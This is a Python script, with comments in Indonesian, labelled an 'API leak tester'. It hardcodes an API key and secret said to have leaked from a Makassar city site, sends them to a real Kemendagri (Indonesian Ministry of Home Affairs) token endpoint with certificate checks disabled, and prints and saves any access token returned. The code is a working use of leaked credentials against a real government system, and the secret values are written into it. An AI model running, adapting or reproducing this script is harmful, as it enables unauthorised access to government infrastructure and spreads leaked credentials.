import requests
import urllib3
import sys
from termcolor import colored
import pyfiglet

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    banner = pyfiglet.figlet_format("API LEAK TESTER", font="small")
    print(colored(banner, 'red'))
    print(colored("[+] Target API: Kemendagri (Via Makassar Leak)", "yellow"))
    print(colored("[+] Analyst: INDRAYAZA Z", "yellow"))
    print("-" * 60)

def test_leak():
    print_banner()
    
    # 1. DATA YANG ANDA TEMUKAN (CREDENTIALS)
    api_key = "f2851b1944cc7400aeda4dc57029a6915273ce28"
    api_secret = "f737b923042c3d8a5e6b70d1ff3dc70b1d5c7b13"
    
    # Endpoint Target (Kemendagri)
    base_url = "https://api.indeks.inovasi.litbang.kemendagri.go.id"
    endpoint = "/api/token"
    
    print(colored("[*] Mencoba menukar Key & Secret dengan Access Token...", "cyan"))
    
    # Menyusun URL Parameter sesuai instruksi bocoran
    # GET /api/token?key=...&secret=...
    params = {
        'key': api_key,
        'secret': api_secret
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    try:
        # Mengirim Request GET
        url = base_url + endpoint
        r = requests.get(url, params=params, headers=headers, verify=False, timeout=10)
        
        print(f"\n[INFO] Request ke: {r.url}")
        print(f"[INFO] Status Code: {r.status_code}")
        
        if r.status_code == 200:
            resp_json = r.json()
            if resp_json.get('status') == 1 and 'token' in resp_json:
                print(colored("\n[CRITICAL] KUNCI VALID! AKSES DITERIMA.", "green", attrs=['bold', 'blink']))
                print(colored(f"[+] Access Token: {resp_json['token']}", "white"))
                
                # Simpan bukti
                with open("api_leak_proof.txt", "w") as f:
                    f.write(f"VULNERABILITY: Hardcoded API Credentials\n")
                    f.write(f"SOURCE: brida.makassarkota.go.id\n")
                    f.write(f"TARGET: kemendagri.go.id\n")
                    f.write(f"TOKEN: {resp_json['token']}\n")
                print(colored("\n[!] Bukti tersimpan di 'api_leak_proof.txt'", "yellow"))
                
            else:
                print(colored("\n[FAIL] Kunci diterima tapi respon aneh.", "yellow"))
                print(r.text)
        elif r.status_code == 401 or r.status_code == 403:
             print(colored("\n[SECURE] Kunci sudah dicabut/kadaluwarsa.", "red"))
        else:
             print(colored(f"\n[ERROR] Server Error: {r.status_code}", "red"))

    except Exception as e:
        print(f"\n[ERROR] Koneksi Gagal: {e}")

if __name__ == "__main__":
    test_leak()
